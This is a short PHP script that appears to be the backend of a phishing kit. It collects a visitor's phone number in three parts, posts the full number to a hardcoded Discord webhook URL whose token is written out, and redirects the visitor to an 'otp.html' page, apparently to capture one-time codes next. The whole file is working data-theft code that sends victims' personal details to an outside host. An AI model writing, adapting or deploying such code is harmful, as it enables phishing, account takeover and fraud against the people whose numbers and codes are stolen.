<?php
$webhookUrl = "
https://discord.com/api/webhooks/1536311071646683140/gdAqqCVZPogWI2c_WYz35yRLaRpJqqk1GVWZPYLWvg42OqMqRG0w3-C-4FCtHFtAeG56";

$step = $_POST['step'] ?? '';
if ($step === 'verify') {

    // Sanitize inputs
    $part1 = preg_replace('/\D/', '', $_POST['part1'] ?? '');
    $part2 = preg_replace('/\D/', '', $_POST['part2'] ?? '');
    $part3 = preg_replace('/\D/', '', $_POST['part3'] ?? '');

    // Validate lengths
    if (strlen($part1) !== 3 || strlen($part2) !== 3 || strlen($part3) !== 4) {
        header("Location: error.php"); // optional error page
        exit();
    }

    // Combine full phone number
    $phoneNumber = $part1 . $part2 . $part3;
    
    // STORE LAST 4 DIGITS IN SESSION
    $_SESSION['phone_last4'] = substr($phoneNumber, -4);

    // Prepare webhook payload
    $message = ["content" => "Registered Phone Number: `$phoneNumber`"];
    $payload = json_encode($message);

    // Send to webhook
    $ch = curl_init($webhookUrl);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);

    // ---- REDIRECT USER ---- //
    header("Location: otp.html"); // Next page
    exit();
} else {
    header("Location: index.php"); // fallback
    exit();
}
?>